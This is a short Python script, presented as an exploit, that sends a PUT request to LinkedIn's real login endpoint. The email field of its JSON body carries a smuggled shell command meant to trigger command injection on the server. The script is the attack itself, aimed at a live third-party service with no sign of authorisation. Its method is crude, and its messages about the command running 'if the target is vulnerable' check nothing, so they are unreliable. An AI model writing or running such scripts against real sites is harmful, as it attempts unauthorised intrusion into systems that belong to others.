import json
import sys

import requests

TARGET = "https://www.linkedin.com/login"

INJECTED_COMMAND = (
    "example@example.com'; touch injection.txt; ls -la | grep injection.txt'"
)

payload = {"email": INJECTED_COMMAND, "password": "password"}

# HTTP headers
headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

session = requests.Session()
session.trust_env = False


def exploit():
    sys.stdout.write("Checking Website Connection\n")
    status_code = session.get("https://www.linkedin.com", timeout=10).status_code
    if status_code <= 400 and status_code >= 200:
        sys.stdout.write("Website is reachable\n")
        try:
            print(
                "[+] Sending malicious JSON payload to trigger command injection>..\n"
            )
            response = session.put(
                TARGET, headers=headers, data=json.dumps(payload), timeout=20
            )
            print(f"[+] HTTP Status Code: {response.status_code}\n")
            if response.status_code <= 400 and response.status_code >= 200:
                print(
                    "[+] if the target is vulnerable, the command should be executed on the server.\n"
                )
            else:
                print(f"[-] Exploit failed: {response.reason}")
                raise Exception(f"{INJECTED_COMMAND} is failed to exploit {TARGET}\n")

        except Exception as e:
            sys.stdout.write(f"Payload hit the firewall: {e}\n")
        finally:
            print("Quitting...")


if __name__ == "__main__":
    exploit()
